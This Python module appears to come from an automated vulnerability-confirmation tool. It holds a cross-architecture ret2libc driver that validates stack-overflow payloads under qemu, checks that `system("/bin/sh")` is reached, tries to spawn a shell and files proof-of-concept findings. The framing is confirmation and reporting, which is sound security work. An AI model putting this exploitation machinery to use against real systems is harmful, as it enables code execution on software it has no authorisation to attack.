"""The cross-architecture ret2libc model: one ABI table + one driver, so adding an ISA is a
registry row plus a small candidate generator rather than a ~130-line copy of the last arch.

Background (doc internal/41). The L2 side is already ISA-neutral (`primitive._RA_BY_ARCH`) and the
confirmation substrate (`debug/qemu_gdb.py`) `supported()`s 15 architectures. But the L3 ret2libc
chains in `exploit_stage.py` were four near-identical bespoke functions (aarch64, arm, riscv64,
ppc64le): each resolved `system`/`"/bin/sh"`, found its gadgets, built a payload, confirmed it over
the qemu gdbstub (reach `system` with the first-argument register == &"/bin/sh", under a negative
control), optionally raised it to a spawned-shell effect, and then filed an *identical* ~70-line
PoC bundle + finding. Only the gadget search, the payload layout and the register/prose names
actually differed.

This module factors that split apart:

* `ArchModel` — the per-ISA facts the shared tail needs (word, endian, the first-argument register
  as the gdbstub names it for the confirm check, its human label for prose, the display label and
  the finding slug). `MODELS` is the registry.
* `Candidate` — what a per-arch generator yields: a fully-built `payload` and its negative-control
  `neg_payload`, the offset to report, the human `blame_body` (everything before "; <proof>."),
  any extra primitive fields (loader/caller/gadget addresses), and the progress-line tail.
* `drive_cross_ret2libc(...)` — the arch-agnostic driver. It runs each candidate's confirm +
  negative control over the passed `cap`, raises the first that holds to a demonstrated effect via
  the injected `shell_effect`, and files the bundle + finding exactly as the four functions did.

The driver takes `cap`, `shell_effect` and `tool_version` as arguments rather than importing them,
so this module has no dependency on `exploit_stage` (which imports it): no import cycle.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Callable, Iterable, Optional


@dataclass(frozen=True)
class ArchModel:
    """The per-ISA facts the cross-arch ret2libc driver needs. One row per supported ISA."""
    name: str                     # canonical arch token (matches target.arch after lower()).
    word: int                     # pointer size in bytes (8 for the 64-bit ISAs here).
    endian: str                   # "little" / "big" -- the TARGET's, used to pack addresses.
    arg0_reg: str                 # first-arg register AS THE GDBSTUB NAMES IT (the confirm key:
                                  #   aarch64 x0, arm r0, riscv64 x10, ppc64 r3).
    arg0_label: str               # the first-arg register in human prose (riscv shows a0 == x10).
    label: str                    # display name in titles/blame ("AArch64", "ARM", ...).
    slug: str                     # finding/bundle id ("aarch64-ret2libc", ...).
    cwe: str = "CWE-121"          # stack-based buffer overflow; shared, overridable per arch.

    def pack(self, value: int) -> bytes:
        """Render an address as the target would store it in memory (width + endianness)."""
        order = "big" if self.endian == "big" else "little"
        return (int(value) & ((1 << (self.word * 8)) - 1)).to_bytes(self.word, order)


# The registry. Adding an ISA to the cross-arch ret2libc ladder starts here: one row, then a
# candidate generator + dispatch clause in exploit_stage. Keys are the lower-cased target.arch.
MODELS: dict[str, ArchModel] = {
    "aarch64": ArchModel("aarch64", 8, "little", "x0", "x0", "AArch64", "aarch64-ret2libc"),
    "arm":     ArchModel("arm", 4, "little", "r0", "r0", "ARM", "arm-ret2libc"),
    "riscv64": ArchModel("riscv64", 8, "little", "x10", "a0", "RISC-V 64", "riscv64-ret2libc"),
    "ppc64":   ArchModel("ppc64", 8, "little", "r3", "r3", "PowerPC64", "ppc64-ret2libc"),
    # LoongArch names its GPRs r0..r31 in the gdbstub layout; a0 (the first argument) is r4.
    "loongarch": ArchModel("loongarch", 8, "little", "r4", "a0", "LoongArch64", "loongarch64-ret2libc"),
    # s390x (IBM Z) -- the first BIG-ENDIAN model, exercising ArchModel.pack's big-endian path.
    # Its first argument register is r2, and its link register is r14 (saved on the stack).
    "s390": ArchModel("s390", 8, "big", "r2", "r2", "s390x", "s390x-ret2libc"),
}

#: arch aliases that map onto a MODELS key (mirrors the arch gates in exploit_stage).
_ALIASES = {"arm64": "aarch64", "riscv": "riscv64", "ppc64le": "ppc64", "powerpc64": "ppc64",
            "loongarch64": "loongarch", "s390x": "s390"}


def model_for(arch: Optional[str]) -> Optional[ArchModel]:
    """The ArchModel for a target arch string, resolving aliases, or None if unsupported."""
    a = (arch or "").lower()
    return MODELS.get(a) or MODELS.get(_ALIASES.get(a, ""))


@dataclass
class Candidate:
    """One attempt a per-arch generator yields. `payload` is the exploit input; `neg_payload` is the
    same input with the byte(s) that FEED the first argument corrupted, so a pass proves the argument
    came from our bytes (argument-causation, not merely return-causation). `blame_body` is the full
    human explanation up to but excluding "; <proof>." (the driver appends the proof it measures).
    `primitive_extra` carries the arch's gadget addresses for the bundle's primitive record, and
    `progress_tail` is the per-candidate suffix of the progress line, e.g. "(offset 136, base 24)"."""
    payload: bytes
    neg_payload: bytes
    offset: int
    blame_body: str
    primitive_extra: dict = field(default_factory=dict)
    progress_tail: str = ""


def drive_cross_ret2libc(
    ctx: Any,
    target: Any,
    target_bytes: bytes,
    exe: str,
    base_argv: list,
    timeout: float,
    *,
    model: ArchModel,
    system: int,
    binsh: int,
    cap: Callable,
    candidates: Iterable[Candidate],
    shell_effect: Callable,
    tool_version: str,
) -> Optional[dict]:
    """Arch-agnostic cross-arch ret2libc driver: confirm each candidate over `cap` (reach `system`
    with the first-argument register == &"/bin/sh"), pass a negative control, then raise the first
    that holds to a demonstrated effect via `shell_effect` and file the identical L3 PoC bundle +
    finding. Returns the stage result dict on success, else None. `cap` is a make_qemu_capture
    callable; `shell_effect(exe, target, payload, timeout)` returns truthy when a real shell ran."""
    import json

    from ...db.dao import FindingDAO, PocDAO
    from . import bundle, exploit

    arg0 = model.arg0_reg
    for c in candidates:
        if ctx.should_cancel():
            return None
        cap0 = cap(c.payload, breakpoints=[system])
        if not (exploit.reached(cap0, system) and (cap0.get("regs") or {}).get(arg0) == binsh):
            continue
        # negative control: with the argument-feeding bytes corrupted, system must NOT see &"/bin/sh"
        if (cap(c.neg_payload, breakpoints=[system]).get("regs") or {}).get(arg0) == binsh:
            continue
        # raise the register-confirmed chain to a DEMONSTRATED EFFECT: run it live and drive the
        # shell system("/bin/sh") spawns with a forgery-proof marker (qemu relays execve to the host).
        shelled = shell_effect(exe, target, c.payload, timeout)
        proof = ("a shell spawned under qemu-user and EVALUATED a forgery-proof marker" if shelled else
                 f"reached system with {model.arg0_label}=&\"/bin/sh\" under the qemu debugger, "
                 f"passing a negative control (register-state proof; a live shell did not come up "
                 f"under emulation)")
        blame = f"{c.blame_body}; {proof}."
        input_sha = ctx.put_artifact(f"{model.slug}-input", data=c.payload)
        meta = {"target_sha256": target.sha256, "arch": target.arch, "level": "L3",
                "exploit": model.slug, "offset": c.offset, "system": hex(system),
                "binsh": hex(binsh), "tool_version": tool_version}
        primitive = {"type": model.slug, "offset": c.offset, "confirmed": True, "note": blame}
        primitive.update(c.primitive_extra)
        data = bundle.build(target_bytes, c.payload, meta, b"", "stdin", base_argv, "SIGTRAP",
                            primitive=primitive)
        bundle_sha = ctx.put_artifact("poc-bundle", data=data, meta={"level": "L3", "verified": True})
        poc_id = PocDAO(ctx.conn).insert(target.id, target.case_id, level="L3", verified=True,
                                         signal_name=None, input_sha=input_sha, bundle_sha=bundle_sha)
        fd = FindingDAO(ctx.conn)
        title = (f"Remote code execution (demonstrated): L3 {model.label} ret2libc -> shell"
                 if shelled else
                 f"Control-flow hijack (confirmed): L3 {model.label} ret2libc -> system(\"/bin/sh\")")
        cand = {"cwe": model.cwe, "title": title,
                "severity": "critical", "detector": "build_exploit", "state": "poc-backed",
                "confidence": 0.99, "authoritative": True, "title_only": True,
                "dedup_key": f"exploit:{model.slug}:{target.id}",
                "site_detail": 'system("/bin/sh")',
                "evidence": [{"channel": "effects", "detail": json.dumps([{
                    "kind": "rce" if shelled else "control-flow-hijack",
                    "title": f"{model.label} ret2libc",
                    "status": "demonstrated" if shelled else "confirmed",
                    "detail": blame, "proof": {"type": "bundle", "sha": bundle_sha,
                                               "input_sha": input_sha, "note": blame}}])}]}
        fd.upsert(target.id, target.case_id, cand)
        fid = fd.id_for_dedup(target.id, cand["dedup_key"])
        if fid:
            PocDAO(ctx.conn).set_finding(poc_id, fid)
        ctx.emit("exploit.done", payload={"supported": True, "confirmed": True,
                 "shell": bool(shelled), "exploit": model.slug, "offset": c.offset,
                 "bundle": bundle_sha})
        ctx.progress(pct=100, msg=f"L3 {'RCE (shell spawned)' if shelled else 'CONFIRMED'}: "
                     f"{model.label} ret2libc -> system(\"/bin/sh\") {c.progress_tail}".rstrip())
        return {"output_shas": [bundle_sha], "output_kind": "poc-bundle",
                "metrics": {"confirmed": True, "level": "L3", "exploit": model.slug,
                            "offset": c.offset, "shell": bool(shelled)}}
    return None
